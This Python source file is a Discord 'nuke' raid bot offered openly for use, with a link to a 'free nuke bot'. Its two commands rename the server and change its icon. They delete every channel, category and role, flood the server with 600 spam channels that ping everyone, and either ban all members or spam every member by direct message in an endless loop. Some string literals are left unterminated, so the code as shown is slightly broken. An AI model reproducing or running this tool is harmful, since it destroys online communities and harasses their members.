import discord
from discord.ext import commands
import random
import string

TOKEN = 'YOUR TOKEN HERE'
bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
bot.remove_command("help")

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Happy Meal Movie"))
    print('Logged in as {0.user}'.format(bot))

@bot.command()
async def nuke_dust(ctx):
  with open('OIP.jpg', 'rb') as f:
    icon = f.read()
  await ctx.guild.edit(name="Server Raided by Happy Meal", icon=icon)
  await ctx.message.delete()
  letters = string.ascii_lowercase
  for channel in ctx.guild.text_channels:
    try:
      await channel.delete()
    except:
      print('Deleted Text Channel')
  for vc in ctx.guild.voice_channels:
    try:
      await vc.delete()
    except:
      print('Deleted Voice Channel')
  for category in ctx.guild.categories:
    try:
      await category.delete()
    except:
      print('Deleted Category')
  for i in range(600):
    try:
      channel_name = ''.join(random.choice(letters) for i in range(100))
      channel = await ctx.guild.create_text_channel(name = channel_name, topic = 'Raided by Happy Meal.')
      await channel.send(f"{ctx.message.guild.default_role} **This Server is Raided by Happy Meal!**\nVisit our github for free nuke bot: https://github.com/HappyMealOfficial/HappyMealBot/
    except:
      pass
  for user in ctx.guild.members:
    print('Got users')
    try:
      await user.ban()
      print(f"Removed {user.name}!")
    except:
      pass
  print("Cleared users")
  for role in ctx.guild.roles:  
    try:  
      await role.delete()
      print(f'Removed role {role.name}')
    except:
      print(f'Unable to removed role {role.name}')

@bot.command()
async def nuke(ctx):
  with open('OIP.jpg', 'rb') as f:
    icon = f.read()
  await ctx.guild.edit(name="Server Raided by Happy Meal", icon=icon)
  await ctx.message.delete()
  letters = string.ascii_lowercase
  for channel in ctx.guild.text_channels:
    try:
      await channel.delete()
    except:
      print('Deleted Text Channel')
  for vc in ctx.guild.voice_channels:
    try:
      await vc.delete()
    except:
      print('Deleted Voice Channel')
  for category in ctx.guild.categories:
    try:
      await category.delete()
    except:
      print('Deleted Category')
  for i in range(600):
    try:
      channel_name = ''.join(random.choice(letters) for i in range(100))
      channel = await ctx.guild.create_text_channel(name = channel_name, topic = 'Raided by Happy Meal.')
      await channel.send(f"{ctx.message.guild.default_role} **This Server is Raided by Happy Meal!**\nVisit our github for free nuke bot: https://github.com/HappyMealOfficial/HappyMealBot/
    except:
      pass
  for role in ctx.guild.roles:  
    try:  
      await role.delete()
      print(f'Removed role {role.name}')
    except:
      print(f'Unable to removed role {role.name}')
  while True:
    for i in ctx.guild.members:
      await i.create_dm()
      await i.dm_channel.send('**This Server is Raided by Happy Meal!**\nVisit our github for free nuke bot: https://github.com/HappyMealOfficial/HappyMealBot/')

                         
bot.run(TOKEN)
